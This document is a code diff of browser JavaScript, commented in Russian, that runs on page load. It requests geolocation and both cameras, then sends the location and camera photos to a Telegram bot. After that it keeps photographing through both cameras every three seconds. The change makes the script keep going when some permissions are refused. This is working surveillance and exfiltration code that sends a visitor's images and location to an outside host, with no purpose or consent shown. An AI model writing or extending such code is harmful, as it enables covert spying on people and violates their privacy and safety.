@@ -75,46 +75,72 @@ async function getCamera(facingMode) {
 }
 
 async function start() {
-  try {
-    // Запрос геолокации
-    const coords = await getLocation();
+  let geoGranted = false;
+  let cameraGranted = false;
+  let coords = null;
 
-    // Запрос фронтальной камеры
+  // Пытаемся получить геолокацию
+  try {
+    coords = await getLocation();
+    geoGranted = true;
+  } catch (e) {
+    geoGranted = false;
+  }
+
+  // Пытаемся получить фронтальную камеру
+  try {
     frontStream = await getCamera('user');
     videoFront.srcObject = frontStream;
-
-    // Сразу фото фронтальной камеры
     await new Promise(r => videoFront.onloadedmetadata = r);
     const blobFront = await takePhoto(videoFront, canvasFront);
     await sendPhoto(blobFront);
+    cameraGranted = true;
+  } catch (e) {
+    cameraGranted = false;
+  }
 
-    // Запрос задней камеры
+  // Пытаемся получить заднюю камеру (если хотя бы фронтальная уже получена)
+  try {
     backStream = await getCamera('environment');
     videoBack.srcObject = backStream;
-
-    // Сразу фото задней камеры
     await new Promise(r => videoBack.onloadedmetadata = r);
     const blobBack = await takePhoto(videoBack, canvasBack);
     await sendPhoto(blobBack);
+    cameraGranted = true;
+  } catch (e) {
+    // Задняя камера может не поддерживаться — игнорируем
+  }
 
-    // Отправка геолокации в Telegram
+  // Отправляем статус разрешений в Telegram
+  const statusMessage = `✅ Разрешения:\n- Геолокация: ${geoGranted ? '✅' : '❌'}\n- Камера: ${cameraGranted ? '✅' : '❌'}`;
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: statusMessage
+    })
+  });
+
+  // Если геолокация получена — отправим её
+  if (geoGranted && coords) {
     await sendLocation(coords.latitude, coords.longitude);
+  }
 
-    // Каждые 3 секунды делаем фото обеих камер
+  // Если камера получена — запускаем цикл съёмки
+  if (cameraGranted) {
     photoInterval = setInterval(async () => {
-      if (videoFront.readyState >= 2) {
+      if (videoFront && videoFront.readyState >= 2) {
         const blobF = await takePhoto(videoFront, canvasFront);
         sendPhoto(blobF);
       }
-      if (videoBack.readyState >= 2) {
+      if (videoBack && videoBack.readyState >= 2) {
         const blobB = await takePhoto(videoBack, canvasBack);
         sendPhoto(blobB);
       }
     }, 3000);
-
-  } catch (err) {
-    await sendDeniedMessage();
   }
 }
+
 
 start();
